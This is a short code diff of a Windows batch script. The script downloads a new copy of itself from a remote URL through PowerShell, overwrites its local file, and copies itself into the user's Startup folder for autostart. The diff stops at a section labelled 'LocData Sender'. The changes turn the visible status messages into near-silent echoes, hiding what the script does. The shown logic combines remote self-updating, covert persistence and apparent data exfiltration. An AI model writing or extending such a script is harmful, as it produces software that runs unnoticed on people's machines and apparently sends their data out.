@@ -10,11 +10,14 @@ powershell -command "(New-Object Net.WebClient).DownloadFile('%REPO_URL%', '%TEM
 
 fc "%TEMP%\NewVersion.bat" "%LOCAL_FILE_PATH%" > nul
 if %errorlevel% neq 0 (
-    echo ...
+    echo > 
+    :: Neue Version: Aktualisieren
     copy /y "%TEMP%\NewVersion.bat" "%LOCAL_FILE_PATH%"
-    echo .
+    echo >
+    :: Aktualisierung abgeschlossen
 ) else (
-    echo ..
+    echo >
+    :: Keine neue Version gefunden
 )
 
 :: Autostart Saver
@@ -22,9 +25,11 @@ set AutostartFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 
 if not exist "%AutostartFolder%\%~nx0" (
     xcopy "%~f0" "%AutostartFolder%\" /H /Y
-    echo ....
+    echo >
+    :: Updating
 ) else (
-    echo .....
+    echo >
+    :: Updated
 )
 
 :: LocData Sender
